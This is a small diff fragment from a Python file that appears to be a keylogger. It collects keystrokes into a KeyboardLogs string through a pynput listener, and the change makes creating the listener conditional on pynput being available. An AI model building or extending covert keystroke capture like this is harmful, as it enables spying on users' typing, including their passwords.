@@ -116,7 +116,8 @@ def OnKeyboardEvent(event):
     else:
         KeyboardLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character
 
-KeyListener = Listener(on_press=OnKeyboardEvent)
+if pynput:
+    KeyListener = Listener(on_press=OnKeyboardEvent)
 
 
 class Client(object):
